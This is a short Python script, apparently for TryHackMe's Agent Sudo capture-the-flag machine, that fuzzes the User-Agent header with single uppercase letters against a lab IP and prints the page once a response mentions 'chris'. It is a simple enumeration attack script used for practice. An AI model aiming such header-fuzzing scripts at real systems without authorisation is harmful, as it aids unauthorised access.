#!/usr/bin/env  python3

# Author:  IRVING ST  -  Username:comandre-ex
# exploit tryhackme's agen-sudo machine, fuzzing the user-agent header


from colorama  import  Fore,Style
import requests,signal,sys,time,pdb,string  
from pwn  import  *  
from bs4  import  BeautifulSoup



# Variables Globales
url = "http://10.10.21.172/"
char = string.ascii_uppercase 
port = 21
ip_address = "10.10.21.172"





# Proxys.
proxies = {
  "http":  "http://127.0.0.1:8080",
  "https": "http://127.0.0.1:8080",
}


# Function ctrl_c  
def  def_handler(sig,frame):
    log.failure(Fore.RED + Style.BRIGHT  + "Exiting....")
    time.sleep(0.5)
    sys.exit(1)

# Function signal  ctrl_c  
signal.signal(signal.SIGINT, def_handler)


def  fuzz_cookie():
    p2 = log.progress(Fore.BLACK + Style.BRIGHT  + "User-agent ")
    for  i  in char:
        headers = {"User-Agent":"%s" % i}
        response = requests.get(url, headers=headers, allow_redirects=True, proxies=proxies)
        p2.status("%s" % i)
        if "chris" in response.text:
            soup =  BeautifulSoup(response.content,  'html.parser')
            print(soup.text)
            break
        else:
            pass
p1 =  log.progress(Fore.RED + Style.BRIGHT  + "Fuzzeando  cabecera...")


if  __name__  == '__main__':
    exploit  =  fuzz_cookie()

